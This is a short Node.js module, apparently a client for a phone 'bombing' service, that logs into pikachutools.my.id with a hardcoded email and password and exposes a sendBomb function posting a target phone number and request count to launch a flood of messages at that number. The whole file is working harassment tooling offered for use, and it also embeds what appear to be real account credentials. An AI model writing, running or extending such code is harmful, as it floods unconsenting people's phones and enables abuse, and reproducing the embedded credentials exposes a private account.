const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');

// 🔐 তোমার Email & Password এখানে
const email = 'maxjihad59@gmail.com';
const password = 'Likhon@#12';

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

async function login() {
  try {
    const loginPage = await client.get('https://pikachutools.my.id/user/login');
    const $ = cheerio.load(loginPage.data);
    const token = $('input[name="_token"]').val();

    await client.post('https://pikachutools.my.id/user/login', {
      email,
      password,
      _token: token
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    return true;
  } catch {
    return false;
  }
}

async function sendBomb(phone, amount) {
  try {
    const res = await client.post('https://pikachutools.my.id/send', {
      nomor: phone,
      jumlah: amount
    });

    if (res.data && res.data.status === true) {
      return `✅ Bomb started to ${phone} with ${amount} requests.`;
    } else {
      return `❌ Failed to start bomb: ${JSON.stringify(res.data)}`;
    }
  } catch (err) {
    return `❌ Error: ${err.response?.data?.message || err.message}`;
  }
}

module.exports = { login, sendBomb };
